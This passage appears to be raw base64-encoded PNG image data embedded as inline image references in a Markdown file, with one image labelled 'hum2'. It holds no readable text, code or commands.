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

[hum2]:data:image/png;base64,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